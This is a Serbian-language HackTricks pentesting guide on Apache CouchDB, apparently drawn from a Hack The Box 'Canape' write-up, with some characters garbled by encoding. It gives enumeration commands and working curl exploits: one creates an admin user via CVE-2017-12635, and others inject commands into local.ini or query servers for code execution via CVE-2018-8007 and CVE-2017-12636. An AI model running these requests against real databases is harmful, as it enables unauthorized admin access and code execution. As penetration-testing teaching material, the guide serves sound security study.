# 5984,6984 - Pentesting CouchDB

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Osnovne informacije**

**CouchDB** je svestrana i mo캖na **baza podataka orijentisana na dokumente** koja organizuje podatke koriste캖i **strukturu mapa klju캜-vrednost** unutar svakog **dokumenta**. Polja unutar dokumenta mogu biti predstavljena kao **klju캜/vrednost parovi, liste ili mape**, pru쬬ju캖i fleksibilnost u skladi코tenju i preuzimanju podataka.

Svaki **dokument** koji se 캜uva u CouchDB dobija **jedinstveni identifikator** (`_id`) na nivou dokumenta. Pored toga, svaka izmena koja se izvr코i i sa캜uva u bazi podataka dobija **broj revizije** (`_rev`). Ovaj broj revizije omogu캖ava efikasno **pra캖enje i upravljanje promenama**, olak코avaju캖i preuzimanje i sinhronizaciju podataka unutar baze podataka.

**Podrazumevani port:** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **Automatska Enumeracija**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## Ru캜na Enumeracija

### Baner
```
curl http://IP:5984/
```
Ovo izdaje GET zahtev instaliranoj CouchDB instanci. Odgovor bi trebao izgledati kao jedan od slede캖ih:
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
Napomena da ako prilikom pristupa root-u couchdb dobijete `401 Unauthorized` sa ne캜im poput: `{"error":"unauthorized","reason":"Authentication required."}` **ne캖ete mo캖i da pristupite** baneru ili bilo kojem drugom kraju.
{% endhint %}

### Info Enumeration

Ovo su krajevi gde mo쬰te pristupiti sa **GET** zahtevom i izvu캖i neke zanimljive informacije. Mo쬰te prona캖i [**vi코e krajeva i detaljnije opise u couchdb dokumentaciji**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** Lista aktivnih zadataka, uklju캜uju캖i tip zadatka, ime, status i ID procesa.
* **`/_all_dbs`** Vra캖a listu svih baza podataka u CouchDB instanci.
* **`/_cluster_setup`** Vra캖a status 캜vora ili klastera, prema 캜arobnjaku za pode코avanje klastera.
* **`/_db_updates`** Vra캖a listu svih doga캠aja u bazi podataka u CouchDB instanci. Postojanje baze podataka `_global_changes` je neophodno za kori코캖enje ovog kraja.
* **`/_membership`** Prikazuje 캜vorove koji su deo klastera kao `cluster_nodes`. Polje `all_nodes` prikazuje sve 캜vorove o kojima ovaj 캜vor zna, uklju캜uju캖i one koji su deo klastera.
* **`/_scheduler/jobs`** Lista zadataka replikacije. Svaki opis zadatka uklju캜uje informacije o izvoru i odredi코tu, ID replikacije, istoriju nedavnih doga캠aja i nekoliko drugih stvari.
* **`/_scheduler/docs`** Lista stanja replikacionih dokumenata. Uklju캜uje informacije o svim dokumentima, 캜ak i u `completed` i `failed` stanjima. Za svaki dokument vra캖a ID dokumenta, bazu podataka, ID replikacije, izvor i odredi코te, i druge informacije.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** Krajnja ta캜ka `/_node/{node-name}` mo쬰 se koristiti za potvrdu imena Erlang 캜vora servera koji obra캠uje zahtev. Ovo je najkorisnije kada pristupate `/_node/_local` da biste dobili ove informacije.
* **`/_node/{node-name}/_stats`** Resurs `_stats` vra캖a JSON objekat koji sadr쬴 statistiku za pokrenuti server. Literalni string `_local` slu쬴 kao alias za lokalno ime 캜vora, tako da se za sve URL-ove statistike, `{node-name}` mo쬰 zameniti sa `_local`, da bi se interagovalo sa statistikama lokalnog 캜vora.
* **`/_node/{node-name}/_system`** Resurs \_system vra캖a JSON objekat koji sadr쬴 razne sistemske statistike za pokrenuti server\_.\_ Mo쬰te koristiti \_\_`_local` kao {node-name} da dobijete informacije o trenutnom 캜voru.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Potvr캠uje da je server aktivan, radi i spreman da odgovori na zahteve. Ako je [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) `true` ili `nolb`, krajnja ta캜ka 캖e vratiti 404 odgovor.
* **`/_uuids`** Zahteva jedan ili vi코e Univerzalno Jedinstvenih Identifikatora (UUID) iz CouchDB instance.
* **`/_reshard`** Vra캖a broj zavr코enih, neuspe코nih, aktivnih, zaustavljenih i ukupnih zadataka zajedno sa stanjem reshardinga na klasteru.

Zanimljivije informacije mogu se izvu캖i kao 코to je obja코njeno ovde: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Database List**
```
curl -X GET http://IP:5984/_all_dbs
```
Ako taj zahtev **odgovara sa 401 neovla코캖en**, onda su vam potrebne **validne akreditive** za pristup bazi podataka:
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
Da biste prona코li va쬰캖e akreditive, mogli biste **poku코ati** [**bruteforce the service**](../generic-methodologies-and-resources/brute-force.md#couchdb).

Ovo je **primer** couchdb **odgovora** kada imate **dovoljno privilegija** da listate baze podataka (To je samo lista db-ova):
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### Database Info

Mo쬰te dobiti neke informacije o bazi podataka (kao 코to su broj fajlova i veli캜ine) pristupaju캖i imenu baze podataka:
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **Lista dokumenata**

Nabrojte svaki unos unutar baze podataka
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **Pro캜itaj Dokument**

Pro캜itaj sadr쬬j dokumenta unutar baze podataka:
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB Privilege Escalation [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Zahvaljuju캖i razlikama izme캠u Erlang i JavaScript JSON parsera, mogli biste **napraviti admin korisnika** sa kredencijalima `hacktricks:hacktricks` sa slede캖im zahtevom:
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**Vi코e informacija o ovoj ranjivosti ovde**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### **Pregled sigurnosti Erlang kola캜i캖a**

Primer [odavde](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

U dokumentaciji CouchDB, posebno u odeljku koji se odnosi na pode코avanje klastera ([link](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)), raspravlja se o kori코캖enju portova od strane CouchDB u re쬴mu klastera. Pominje se da, kao u samostalnom re쬴mu, port `5984` se koristi. Pored toga, port `5986` je za lokalne API-je, a 코to je va쬹o, Erlang zahteva TCP port `4369` za Erlang Port Mapper Daemon (EPMD), koji olak코ava komunikaciju izme캠u 캜vorova unutar Erlang klastera. Ova konfiguracija formira mre쬿 gde je svaki 캜vor me캠usobno povezan sa svim ostalim 캜vorovima.

Klju캜na sigurnosna preporuka se isti캜e u vezi sa portom `4369`. Ako je ovaj port dostupan preko Interneta ili bilo koje nepouzdane mre쬰, sigurnost sistema se u velikoj meri oslanja na jedinstveni identifikator poznat kao "kola캜i캖." Ovaj kola캜i캖 deluje kao za코tita. Na primer, u datoj listi procesa, mo쬰 se primetiti kola캜i캖 nazvan "monster", 코to ukazuje na njegovu operativnu ulogu u okviru sigurnosnog sistema.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
Za one koji su zainteresovani da razumeju kako se ovaj "kola캜i캖" mo쬰 iskoristiti za Remote Code Execution (RCE) u kontekstu Erlang sistema, dostupna je posve캖ena sekcija za dalju lektiru. Ona detaljno opisuje metodologije za kori코캖enje Erlang kola캜i캖a na neovla코캖en na캜in kako bi se postigla kontrola nad sistemima. Mo쬰te **[istra쬴ti detaljan vodi캜 o zloupotrebi Erlang kola캜i캖a za RCE ovde](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **Iskori코캖avanje CVE-2018-8007 kroz modifikaciju local.ini**

Primer [odavde](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Nedavno otkrivena ranjivost, CVE-2018-8007, koja uti캜e na Apache CouchDB, istra쬰na je, otkrivaju캖i da iskori코캖avanje zahteva prava za pisanje na `local.ini` datoteku. Iako nije direktno primenljivo na inicijalni ciljni sistem zbog bezbednosnih ograni캜enja, izvr코ene su modifikacije kako bi se omogu캖io pristup za pisanje na `local.ini` datoteku u svrhe istra쬴vanja. Detaljni koraci i primeri koda su navedeni u nastavku, prikazuju캖i proces.

Prvo, okru쬰nje se priprema osiguravaju캖i da je `local.ini` datoteka zapisiva, 코to se proverava listanjem dozvola:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
Da bi se iskoristila ranjivost, izvr코ava se curl komanda, koja cilja `cors/origins` konfiguraciju u `local.ini`. Ovo ubacuje novu origin zajedno sa dodatnim komandama pod `[os_daemons]` sekcijom, sa ciljem izvr코avanja proizvoljnog koda:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
Kasnija verifikacija pokazuje injektovanu konfiguraciju u `local.ini`, upore캠uju캖i je sa rezervnom kopijom kako bi se istakle promene:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
U po캜etku, o캜ekivana datoteka (`/tmp/0xdf`) ne postoji, 코to ukazuje na to da injektovana komanda jo코 nije izvr코ena. Dalja istraga otkriva da su procesi povezani sa CouchDB u radu, uklju캜uju캖i jedan koji bi potencijalno mogao izvr코iti injektovanu komandu:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
Prekidom identifikovanog CouchDB procesa i omogu캖avanjem sistemu da ga automatski ponovo pokrene, pokre캖e se izvr코enje injektovane komande, 코to je potvr캠eno postojanjem prethodno nedostaju캖e datoteke:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
Ova eksploracija potvr캠uje izvodljivost eksploatacije CVE-2018-8007 pod specifi캜nim uslovima, posebno zahtevom za zapisivim pristupom `local.ini` datoteci. Pru쬰ni primeri koda i proceduralni koraci nude jasan vodi캜 za replikaciju eksploata u kontrolisanom okru쬰nju.

Za vi코e detalja o CVE-2018-8007, pogledajte savetovanje od mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **Istra쬴vanje CVE-2017-12636 sa dozvolama za pisanje na local.ini**

Primer [odavde](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

Ranljivost poznata kao CVE-2017-12636 je istra쬰na, koja omogu캖ava izvr코avanje koda putem CouchDB procesa, iako specifi캜ne konfiguracije mogu spre캜iti njenu eksploataciju. I pored brojnih referenci na Proof of Concept (POC) dostupnih na mre쬴, potrebne su prilagodbe za eksploataciju ranjivosti na CouchDB verziji 2, koja se razlikuje od uobi캜ajeno ciljanih verzija 1.x. Po캜etni koraci uklju캜uju verifikaciju verzije CouchDB i potvr캠ivanje odsustva o캜ekivane putanje servera za upite:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
Da bi se prilagodila CouchDB verziji 2.0, koristi se novi put:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
Poku코aji dodavanja i pozivanja novog servera za upite nai코li su na gre코ke vezane za dozvole, 코to je nazna캜eno slede캖im izlazom:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Dalja istraga je otkrila probleme sa dozvolama za `local.ini` datoteku, koja nije mogla da se pi코e. Modifikovanjem dozvola datoteke sa root ili homer pristupom, postalo je mogu캖e nastaviti:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
Kasniji poku코aji dodavanja servera za upite su uspeli, 코to je potvr캠eno odsustvom poruka o gre코ci u odgovoru. Uspje코na modifikacija `local.ini` datoteke je potvr캠ena kroz pore캠enje datoteka:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
Proces se nastavio kreiranjem baze podataka i dokumenta, nakon 캜ega je usledio poku코aj izvr코avanja koda putem prilago캠enog prikaza mapiranja na novonadded server za upite:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
A **[rezime](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** sa alternativnim payload-om pru쬬 dodatne uvide u eksploataciju CVE-2017-12636 pod specifi캜nim uslovima. **Korisni resursi** za eksploataciju ove ranjivosti uklju캜uju:

- [POC exploit kod](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [Unos u Exploit Database](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## Reference

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
